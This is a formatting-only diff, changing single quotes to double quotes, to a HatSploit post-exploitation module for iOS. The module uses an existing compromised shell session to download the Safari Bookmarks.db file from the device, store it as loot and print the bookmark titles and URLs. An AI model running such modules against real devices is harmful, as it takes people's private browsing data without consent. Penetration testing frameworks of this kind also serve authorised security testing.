@@ -12,33 +12,33 @@ from pex.db import DB
 
 class HatSploitModule(Module, Sessions, DB):
     details = {
-        'Category': "post",
-        'Name': "Obtain Safari bookmarks",
-        'Module': "post/apple_ios/shell/safari_bookmarks",
-        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
-        'Description': "Get iOS Safari bookmarks database and parse it.",
-        'Platform': "apple_ios",
-        'Rank': "medium",
+        "Category": "post",
+        "Name": "Obtain Safari bookmarks",
+        "Module": "post/apple_ios/shell/safari_bookmarks",
+        "Authors": ["Ivan Nikolsky (enty8080) - module developer"],
+        "Description": "Get iOS Safari bookmarks database and parse it.",
+        "Platform": "apple_ios",
+        "Rank": "medium",
     }
 
     options = {
-        'SESSION': {
-            'Description': "Session to run on.",
-            'Value': None,
-            'Type': {'session': {'Platforms': ['apple_ios'], 'Type': 'shell'}},
-            'Required': True,
+        "SESSION": {
+            "Description": "Session to run on.",
+            "Value": None,
+            "Type": {"session": {"Platforms": ["apple_ios"], "Type": "shell"}},
+            "Required": True,
         },
-        'PATH': {
-            'Description': "Path to save file.",
-            'Value': Loot().specific_loot('Bookmarks.db'),
-            'Type': None,
-            'Required': True,
+        "PATH": {
+            "Description": "Path to save file.",
+            "Value": Loot().specific_loot("Bookmarks.db"),
+            "Type": None,
+            "Required": True,
         },
     }
 
     def run(self):
         session, path = self.parse_options(self.options)
-        bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
+        bookmarks = "/private/var/mobile/Library/Safari/Bookmarks.db"
 
         path = self.session_download(session, bookmarks, path)
         if path:
@@ -52,9 +52,9 @@ class HatSploitModule(Module, Sessions, DB):
 
             bookmarks_data = []
             for item in bookmarks:
-                bookmarks_data.append((item['title'], item['url']))
+                bookmarks_data.append((item["title"], item["url"]))
 
             if bookmarks_data:
-                self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
+                self.print_table("Bookmarks", ("Title", "URL"), *bookmarks_data)
             else:
                 self.print_warning("No bookmarks available on device.")
